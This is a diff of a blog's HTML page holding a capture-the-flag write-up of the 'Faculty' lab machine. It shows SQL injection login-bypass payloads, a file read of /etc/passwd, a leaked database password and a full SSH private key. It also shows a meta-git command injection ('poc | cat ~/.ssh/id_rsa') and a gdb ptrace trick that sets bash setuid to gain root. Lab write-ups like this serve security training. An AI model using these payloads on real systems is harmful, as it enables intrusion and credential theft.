 &quot; OR 1 &#x3D; 1 -- -
-&#39; OR &#39;&#39; &#x3D; &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#39; OR &#39;&#39; &#x3D; &#39;</code></pre>
 <p>After using one of the payloads we will see that we are indeed successfully in.</p>
 <img src="/2022/09/27/faculty/20220927142353.png" class="">
 <p>Now after some research and looking on the page, we can see that in the <em>Faculty List</em> we can add &#x2F; download pdf’s.</p>
@@ -138,127 +138,127 @@ by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="to
 <p>So now intercept the request, replace it with our payload and forward it.<br>After doing that, download the pdf and open it with some <strong>PDF Viewer</strong></p>
 <img src="/2022/09/27/faculty/20220927144213.png" class="">
 <p>We can see that the payload it’s successfully working.</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">cat</span> etc_passwd.txt<span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-i</span> <span class="token string">"sh$"</span> <span class="token parameter variable">--color</span><span class="token operator">=</span>auto
-root:x:0:0:root:/root:/bin/bash
-gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
-developer:x:1001:1002:,,,:/home/developer:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ cat etc_passwd.txt| grep -i &quot;sh$&quot; --color&#x3D;auto
+root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+gbyolo:x:1000:1000:gbyolo:&#x2F;home&#x2F;gbyolo:&#x2F;bin&#x2F;bash
+developer:x:1001:1002:,,,:&#x2F;home&#x2F;developer:&#x2F;bin&#x2F;bash</code></pre>
 <p>Now that we can extract files we will need to find a file that will allow us to do that.<br>We have 2 options here: 1 is to use the sql vulnerability that we found in the login page to find some paths or use the <strong>Faculty Scheduling System</strong> in order to do that<br>I used the 2nd option and found the absolute path to the application.</p>
 <img src="/2022/09/27/faculty/20220927144859.png" class="">
 <p>Now with that in mind we can extract the <strong>admin_class.php</strong> and maybe find something interesting<br>After downloading the <strong>&#x2F;var&#x2F;www&#x2F;scheduling&#x2F;admin&#x2F;admin_class.php</strong> we found a <em>db</em> file:</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">Class</span> <span class="token class-name-definition class-name">Action</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">private</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+session_start();
+ini_set(&#39;display_errors&#39;, 1);
+Class Action &#123;
+        private $db;
 
-        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">include</span> <span class="token string single-quoted-string">'db_connect.php'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+        public function __construct() &#123;
+                ob_start();
+        include &#39;db_connect.php&#39;;</code></pre>
 <p>Inside the <strong>db_connect.php</strong> we had some credentials. Remembering the <strong>&#x2F;etc&#x2F;passwd</strong> we tried the credentials for the 2 users that we had: <em>developer</em> and <em>gbyolo</em>.</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$conn</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sched'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Co.met06aci.dly53ro.per'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'scheduling_db'</span><span class="token punctuation">)</span><span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Could not connect to mysql"</span><span class="token operator">.</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">$conn&#x3D; new mysqli(&#39;localhost&#39;,&#39;sched&#39;,&#39;Co.met06aci.dly53ro.per&#39;,&#39;scheduling_db&#39;)or die(&quot;Could not connect to mysql&quot;.mysqli_error($con));</code></pre>
 <p>When we tried to connect with the user <em>gbyolo</em> we got a successfull hit</p>
 <img src="/2022/09/27/faculty/20220927145434.png" class="">
 
-<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h3 id="Information-Gathering-Operating-System"><a href="#Information-Gathering-Operating-System" class="headerlink" title="Information Gathering ( Operating System )"></a>Information Gathering ( Operating System )</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-bash-5.0$ <span class="token function">cat</span> /etc/*-release
-<span class="token assign-left variable">DISTRIB_ID</span><span class="token operator">=</span>Ubuntu
-<span class="token assign-left variable">DISTRIB_RELEASE</span><span class="token operator">=</span><span class="token number">20.04</span>
-<span class="token assign-left variable">DISTRIB_CODENAME</span><span class="token operator">=</span>focal
-<span class="token assign-left variable">DISTRIB_DESCRIPTION</span><span class="token operator">=</span><span class="token string">"Ubuntu 20.04.4 LTS"</span>
-<span class="token assign-left variable">NAME</span><span class="token operator">=</span><span class="token string">"Ubuntu"</span>
-<span class="token assign-left variable">VERSION</span><span class="token operator">=</span><span class="token string">"20.04.4 LTS (Focal Fossa)"</span>
-<span class="token assign-left variable">ID</span><span class="token operator">=</span>ubuntu
-<span class="token assign-left variable">ID_LIKE</span><span class="token operator">=</span>debian
-<span class="token assign-left variable">PRETTY_NAME</span><span class="token operator">=</span><span class="token string">"Ubuntu 20.04.4 LTS"</span>
-<span class="token assign-left variable">VERSION_ID</span><span class="token operator">=</span><span class="token string">"20.04"</span>
-<span class="token assign-left variable">HOME_URL</span><span class="token operator">=</span><span class="token string">"https://www.ubuntu.com/"</span>
-<span class="token assign-left variable">SUPPORT_URL</span><span class="token operator">=</span><span class="token string">"https://help.ubuntu.com/"</span>
-<span class="token assign-left variable">BUG_REPORT_URL</span><span class="token operator">=</span><span class="token string">"https://bugs.launchpad.net/ubuntu/"</span>
-<span class="token assign-left variable">PRIVACY_POLICY_URL</span><span class="token operator">=</span><span class="token string">"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"</span>
-<span class="token assign-left variable">VERSION_CODENAME</span><span class="token operator">=</span>focal
-<span class="token assign-left variable">UBUNTU_CODENAME</span><span class="token operator">=</span>focal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h3 id="Information-Gathering-Operating-System"><a href="#Information-Gathering-Operating-System" class="headerlink" title="Information Gathering ( Operating System )"></a>Information Gathering ( Operating System )</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-bash-5.0$ cat &#x2F;etc&#x2F;*-release
+DISTRIB_ID&#x3D;Ubuntu
+DISTRIB_RELEASE&#x3D;20.04
+DISTRIB_CODENAME&#x3D;focal
+DISTRIB_DESCRIPTION&#x3D;&quot;Ubuntu 20.04.4 LTS&quot;
+NAME&#x3D;&quot;Ubuntu&quot;
+VERSION&#x3D;&quot;20.04.4 LTS (Focal Fossa)&quot;
+ID&#x3D;ubuntu
+ID_LIKE&#x3D;debian
+PRETTY_NAME&#x3D;&quot;Ubuntu 20.04.4 LTS&quot;
+VERSION_ID&#x3D;&quot;20.04&quot;
+HOME_URL&#x3D;&quot;https:&#x2F;&#x2F;www.ubuntu.com&#x2F;&quot;
+SUPPORT_URL&#x3D;&quot;https:&#x2F;&#x2F;help.ubuntu.com&#x2F;&quot;
+BUG_REPORT_URL&#x3D;&quot;https:&#x2F;&#x2F;bugs.launchpad.net&#x2F;ubuntu&#x2F;&quot;
+PRIVACY_POLICY_URL&#x3D;&quot;https:&#x2F;&#x2F;www.ubuntu.com&#x2F;legal&#x2F;terms-and-policies&#x2F;privacy-policy&quot;
+VERSION_CODENAME&#x3D;focal
+UBUNTU_CODENAME&#x3D;focal</code></pre>
 
 <p>-&gt; sudo -l:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-bash-5.0$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
-<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> gbyolo: 
-Matching Defaults entries <span class="token keyword">for</span> gbyolo on faculty:
-    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-bash-5.0$ sudo -l
+[sudo] password for gbyolo: 
+Matching Defaults entries for gbyolo on faculty:
+    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin
 
 User gbyolo may run the following commands on faculty:
-    <span class="token punctuation">(</span>developer<span class="token punctuation">)</span> /usr/local/bin/meta-git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    (developer) &#x2F;usr&#x2F;local&#x2F;bin&#x2F;meta-git</code></pre>
 
 <p>Looking for a privilage escalation vector for <strong>meta-git</strong> we found out that we could do some command injection due to improper input handling: <a target="_blank" rel="noopener" href="https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49">https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49</a></p>
 <img src="/2022/09/27/faculty/20220927145734.png" class="">
 <p>Payload: </p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gbyolo@faculty:/$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> developer meta-git clone <span class="token string">'poc | cat ~/.ssh/id_rsa'</span>
-meta <span class="token function">git</span> cloning into <span class="token string">'poc | cat ~/.ssh/id_rsa'</span> at id_rsa
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gbyolo@faculty:&#x2F;$ sudo -u developer meta-git clone &#39;poc | cat ~&#x2F;.ssh&#x2F;id_rsa&#39;
+meta git cloning into &#39;poc | cat ~&#x2F;.ssh&#x2F;id_rsa&#39; at id_rsa
 id_rsa:
-fatal: repository <span class="token string">'poc'</span> does not exist
+fatal: repository &#39;poc&#39; does not exist
 
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAYEAxDAgrHcD2I4U329//sdapn4ncVzRYZxACC/czxmSO5Us2S87dxyw
-izZ0hDszHyk+bCB5B1wvrtmAFu2KN4aGCoAJMNGmVocBnIkSczGp/zBy0pVK6H7g6GMAVS
-pribX/DrdHCcmsIu7WqkyZ0mDN2sS+3uMk6I3361x2ztAG1aC9xJX7EJsHmXDRLZ8G1Rib
+NhAAAAAwEAAQAAAYEAxDAgrHcD2I4U329&#x2F;&#x2F;sdapn4ncVzRYZxACC&#x2F;czxmSO5Us2S87dxyw
+izZ0hDszHyk+bCB5B1wvrtmAFu2KN4aGCoAJMNGmVocBnIkSczGp&#x2F;zBy0pVK6H7g6GMAVS
+pribX&#x2F;DrdHCcmsIu7WqkyZ0mDN2sS+3uMk6I3361x2ztAG1aC9xJX7EJsHmXDRLZ8G1Rib
 KpI0WqAWNSXHDDvcwDpmWDk+NlIRKkpGcVByzhG8x1azvKWS9G36zeLLARBP43ax4eAVrs
-Ad+7ig3vl9Iv+ZtRzkH0PsMhriIlHBNUy9dFAGP5aa4ZUkYHi1/MlBnsWOgiRHMgcJzcWX
-OGeIJbtcdp2aBOjZlGJ+G6uLWrxwlX9anM3gPXTT4DGqZV1Qp/3+JZF19/KXJ1dr0i328j
-saMlzDijF5bZjpAOcLxS0V84t99R/7bRbLdFxME/0xyb6QMKcMDnLrDUmdhiObROZFl3v5
-hnsW9CoFLiKE/4jWKP6lPU+31GOTpKtLXYMDbcepAAAFiOUui47lLouOAAAAB3NzaC1yc2
-EAAAGBAMQwIKx3A9iOFN9vf/7HWqZ+J3Fc0WGcQAgv3M8ZkjuVLNkvO3ccsIs2dIQ7Mx8p
-PmwgeQdcL67ZgBbtijeGhgqACTDRplaHAZyJEnMxqf8wctKVSuh+4OhjAFUqa4m1/w63Rw
+Ad+7ig3vl9Iv+ZtRzkH0PsMhriIlHBNUy9dFAGP5aa4ZUkYHi1&#x2F;MlBnsWOgiRHMgcJzcWX
+OGeIJbtcdp2aBOjZlGJ+G6uLWrxwlX9anM3gPXTT4DGqZV1Qp&#x2F;3+JZF19&#x2F;KXJ1dr0i328j
+saMlzDijF5bZjpAOcLxS0V84t99R&#x2F;7bRbLdFxME&#x2F;0xyb6QMKcMDnLrDUmdhiObROZFl3v5
+hnsW9CoFLiKE&#x2F;4jWKP6lPU+31GOTpKtLXYMDbcepAAAFiOUui47lLouOAAAAB3NzaC1yc2
+EAAAGBAMQwIKx3A9iOFN9vf&#x2F;7HWqZ+J3Fc0WGcQAgv3M8ZkjuVLNkvO3ccsIs2dIQ7Mx8p
+PmwgeQdcL67ZgBbtijeGhgqACTDRplaHAZyJEnMxqf8wctKVSuh+4OhjAFUqa4m1&#x2F;w63Rw
 nJrCLu1qpMmdJgzdrEvt7jJOiN9+tcds7QBtWgvcSV+xCbB5lw0S2fBtUYmyqSNFqgFjUl
 xww73MA6Zlg5PjZSESpKRnFQcs4RvMdWs7ylkvRt+s3iywEQT+N2seHgFa7AHfu4oN75fS
-L/mbUc5B9D7DIa4iJRwTVMvXRQBj+WmuGVJGB4tfzJQZ7FjoIkRzIHCc3FlzhniCW7XHad
-mgTo2ZRifhuri1q8cJV/WpzN4D100+AxqmVdUKf9/iWRdffylydXa9It9vI7GjJcw4oxeW
+L&#x2F;mbUc5B9D7DIa4iJRwTVMvXRQBj+WmuGVJGB4tfzJQZ7FjoIkRzIHCc3FlzhniCW7XHad
+mgTo2ZRifhuri1q8cJV&#x2F;WpzN4D100+AxqmVdUKf9&#x2F;iWRdffylydXa9It9vI7GjJcw4oxeW
 2Y6QDnC8UtFfOLffUf+20Wy3RcTBP9Mcm+kDCnDA5y6w1JnYYjm0TmRZd7+YZ7FvQqBS4i
-hP+I1ij+pT1Pt9Rjk6SrS12DA23HqQAAAAMBAAEAAAGBAIjXSPMC0Jvr/oMaspxzULdwpv
-JbW3BKHB+Zwtpxa55DntSeLUwXpsxzXzIcWLwTeIbS35hSpK/A5acYaJ/yJOyOAdsbYHpa
-ELWupj/TFE/66xwXJfilBxsQctr0i62yVAVfsR0Sng5/qRt/8orbGrrNIJU2uje7ToHMLN
+hP+I1ij+pT1Pt9Rjk6SrS12DA23HqQAAAAMBAAEAAAGBAIjXSPMC0Jvr&#x2F;oMaspxzULdwpv
+JbW3BKHB+Zwtpxa55DntSeLUwXpsxzXzIcWLwTeIbS35hSpK&#x2F;A5acYaJ&#x2F;yJOyOAdsbYHpa
+ELWupj&#x2F;TFE&#x2F;66xwXJfilBxsQctr0i62yVAVfsR0Sng5&#x2F;qRt&#x2F;8orbGrrNIJU2uje7ToHMLN
 J0J1A6niLQuh4LBHHyTvUTRyC72P8Im5varaLEhuHxnzg1g81loA8jjvWAeUHwayNxG8uu
-ng+nLalwTM/usMo9Jnvx/UeoKnKQ4r5AunVeM7QQTdEZtwMk2G4vOZ9ODQztJO7aCDCiEv
-Hx9U9A6HNyDEMfCebfsJ9voa6i+rphRzK9or/+IbjH3JlnQOZw8JRC1RpI/uTECivtmkp4
-ZrFF5YAo9ie7ctB2JIujPGXlv/F8Ue9FGN6W4XW7b+HfnG5VjCKYKyrqk/yxMmg6w2Y5P5
-N/NvWYyoIZPQgXKUlTzYj984plSl2+k9Tca27aahZOSLUceZqq71aXyfKPGWoITp5dAQAA
-AMEAl5stT0pZ0iZLcYi+b/7ZAiGTQwWYS0p4Glxm204DedrOD4c/Aw7YZFZLYDlL2KUk6o
-0M2X9joquMFMHUoXB7DATWknBS7xQcCfXH8HNuKSN385TCX/QWNfWVnuIhl687Dqi2bvBt
+ng+nLalwTM&#x2F;usMo9Jnvx&#x2F;UeoKnKQ4r5AunVeM7QQTdEZtwMk2G4vOZ9ODQztJO7aCDCiEv
+Hx9U9A6HNyDEMfCebfsJ9voa6i+rphRzK9or&#x2F;+IbjH3JlnQOZw8JRC1RpI&#x2F;uTECivtmkp4
+ZrFF5YAo9ie7ctB2JIujPGXlv&#x2F;F8Ue9FGN6W4XW7b+HfnG5VjCKYKyrqk&#x2F;yxMmg6w2Y5P5
+N&#x2F;NvWYyoIZPQgXKUlTzYj984plSl2+k9Tca27aahZOSLUceZqq71aXyfKPGWoITp5dAQAA
+AMEAl5stT0pZ0iZLcYi+b&#x2F;7ZAiGTQwWYS0p4Glxm204DedrOD4c&#x2F;Aw7YZFZLYDlL2KUk6o
+0M2X9joquMFMHUoXB7DATWknBS7xQcCfXH8HNuKSN385TCX&#x2F;QWNfWVnuIhl687Dqi2bvBt
 pMMKNYMMYDErB1dpYZmh8mcMZgHN3lAK06Xdz57eQQt0oGq6btFdbdVDmwm+LuTRwxJSCs
 Qtc2vyQOEaOpEad9RvTiMNiAKy1AnlViyoXAW49gIeK1ay7z3jAAAAwQDxEUTmwvt+oX1o
-1U/ZPaHkmi/VKlO3jxABwPRkFCjyDt6AMQ8K9kCn1ZnTLy+J1M+tm1LOxwkY3T5oJi/yLt
+1U&#x2F;ZPaHkmi&#x2F;VKlO3jxABwPRkFCjyDt6AMQ8K9kCn1ZnTLy+J1M+tm1LOxwkY3T5oJi&#x2F;yLt
 ercex4AFaAjZD7sjX9vDqX8atR8M1VXOy3aQ0HGYG2FF7vEFwYdNPfGqFLxLvAczzXHBud
-QzVDjJkn6+ANFdKKR3j3s9xnkb5j+U/jGzxvPGDpCiZz0I30KRtAzsBzT1ZQMEvKrchpmR
+QzVDjJkn6+ANFdKKR3j3s9xnkb5j+U&#x2F;jGzxvPGDpCiZz0I30KRtAzsBzT1ZQMEvKrchpmR
 jrzHFkgTUug0lsPE4ZLB0Re6Iq3ngtaNUAAADBANBXLol4lHhpWL30or8064fjhXGjhY4g
 blDouPQFIwCaRbSWLnKvKCwaPaZzocdHlr5wRXwRq8V1VPmsxX8O87y9Ro5guymsdPprXF
-LETXujOl8CFiHvMA1Zf6eriE1/Od3JcUKiHTwv19MwqHitxUcNW0sETwZ+FAHBBuc2NTVF
+LETXujOl8CFiHvMA1Zf6eriE1&#x2F;Od3JcUKiHTwv19MwqHitxUcNW0sETwZ+FAHBBuc2NTVF
 YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
-<span class="token assign-left variable">9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ</span><span class="token operator">==</span>
------END OPENSSH PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ&#x3D;&#x3D;
+-----END OPENSSH PRIVATE KEY-----</code></pre>
 
 <p>Connecting to the user <strong>developer</strong> we can see that it’s in some strange <strong>debug</strong> group</p>
 <img src="/2022/09/27/faculty/20220927150445.png" class="">
 <p>When I looked for files that the groups <strong>debug</strong> owned, I found:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-bash-5.0$ <span class="token function">find</span> / <span class="token parameter variable">-group</span> debug <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
-/usr/bin/gdb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-bash-5.0$ find &#x2F; -group debug 2&gt;&#x2F;dev&#x2F;null
+&#x2F;usr&#x2F;bin&#x2F;gdb</code></pre>
 <p>So this will be our way to priv esc to root:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">developer@faculty:~$ <span class="token function">ls</span> <span class="token parameter variable">-l</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> gdb<span class="token variable">)</span></span>
--rwxr-x--- <span class="token number">1</span> root debug <span class="token number">8440200</span> Dec  <span class="token number">8</span>  <span class="token number">2021</span> /usr/bin/gdb
-developer@faculty:~$ getcap <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> gdb<span class="token variable">)</span></span>
-/usr/bin/gdb <span class="token operator">=</span> cap_sys_ptrace+ep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">developer@faculty:~$ ls -l $(which gdb)
+-rwxr-x--- 1 root debug 8440200 Dec  8  2021 &#x2F;usr&#x2F;bin&#x2F;gdb
+developer@faculty:~$ getcap $(which gdb)
+&#x2F;usr&#x2F;bin&#x2F;gdb &#x3D; cap_sys_ptrace+ep</code></pre>
 
 <p><strong>cap_sys_ptrace+ep</strong> means that you can escape the container by injecting a shellcode inside some process running inside the host.<br>To exploit this, we need to find a process that runs as root and attach the gdb instance to that specific process</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-bash-5.0$ <span class="token function">ps</span> <span class="token parameter variable">-aux</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-i</span> root <span class="token operator">|</span> <span class="token function">grep</span> python3
-root         <span class="token number">728</span>  <span class="token number">0.0</span>  <span class="token number">0.9</span>  <span class="token number">26896</span> <span class="token number">18140</span> ?        Ss   06:04   <span class="token number">0</span>:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
--bash-5.0$ gdb <span class="token parameter variable">-p</span> <span class="token number">728</span>
-GNU gdb <span class="token punctuation">(</span>Ubuntu <span class="token number">9.2</span>-0ubuntu1~20.04.1<span class="token punctuation">)</span> <span class="token number">9.2</span>
-Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> <span class="token number">2020</span> Free Software Foundation, Inc.
-<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> call <span class="token punctuation">(</span>void<span class="token punctuation">)</span>system<span class="token punctuation">(</span><span class="token string">"chmod u+s /bin/bash"</span><span class="token punctuation">)</span>
-<span class="token punctuation">[</span>Detaching after vfork from child process <span class="token number">58692</span><span class="token punctuation">]</span>
-<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> quit
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-bash-5.0$ ps -aux | grep -i root | grep python3
+root         728  0.0  0.9  26896 18140 ?        Ss   06:04   0:00 &#x2F;usr&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;bin&#x2F;networkd-dispatcher --run-startup-triggers
+-bash-5.0$ gdb -p 728
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+(gdb) call (void)system(&quot;chmod u+s &#x2F;bin&#x2F;bash&quot;)
+[Detaching after vfork from child process 58692]
+(gdb) quit
 A debugging session is active.
 
-    Inferior <span class="token number">1</span> <span class="token punctuation">[</span>process <span class="token number">728</span><span class="token punctuation">]</span> will be detached.
+    Inferior 1 [process 728] will be detached.
 
--bash-5.0$ <span class="token function">bash</span> <span class="token parameter variable">-p</span>
-bash-5.0<span class="token comment"># id</span>
-<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>developer<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>developer<span class="token punctuation">)</span> <span class="token assign-left variable">euid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1002</span><span class="token punctuation">(</span>developer<span class="token punctuation">)</span>,1001<span class="token punctuation">(</span>debug<span class="token punctuation">)</span>,1003<span class="token punctuation">(</span>faculty<span class="token punctuation">)</span>
-bash-5.0<span class="token comment"># cat /root/root.txt</span>
-98179f742f66af3cd43521213fbacf83<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2022/10/17/blue-team/" title="Blue Team"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Blue Team</span></a><a class="button is-default" href="/2022/09/23/shoppy/" title="Shoppy"><span class="has-text-weight-semibold">Next: Shoppy</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/IulianSiPunct"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ischyr"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201/"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Ischyr</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><div style="margin-top: 2px"></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
+-bash-5.0$ bash -p
+bash-5.0# id
+uid&#x3D;1001(developer) gid&#x3D;1002(developer) euid&#x3D;0(root) groups&#x3D;1002(developer),1001(debug),1003(faculty)
+bash-5.0# cat &#x2F;root&#x2F;root.txt
+98179f742f66af3cd43521213fbacf83</code></pre></article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2022/10/17/blue-team/" title="Blue Team"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Blue Team</span></a><a class="button is-default" href="/2022/09/23/shoppy/" title="Shoppy"><span class="has-text-weight-semibold">Next: Shoppy</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="Haojen/Claudia-theme-blog" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article><article class="mt-6 comment-container" id="vcomments"></article><div id="disqus_thread"></div><article class="mt-6 comment-container" id="disqus"><script>var disqus_config = function () {this.page.url = 'null/2022/09/27/faculty/';this.page.identifier = 'null';};</script><script>(function() {var d = document, s = d.createElement('script');s.src = 'https://null.disqus.com/embed.js';s.setAttribute('data-timestamp', +new Date());(d.head || d.body).appendChild(s);})();</script><script id="dsq-count-scr" src="//blog-pubgj2togw.disqus.com/count.js" async></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com/IulianSiPunct"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ischyr"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><a title="linkedin" target="_blank" rel="noopener nofollow" href="//www.linkedin.com/in/iulian-schifirnet-238049201/"><i class="iconfont icon-linkedin"></i></a><!-- 脸书--></section><p><span>Copyright ©</span><span> Ischyr</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><div style="margin-top: 2px"></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script 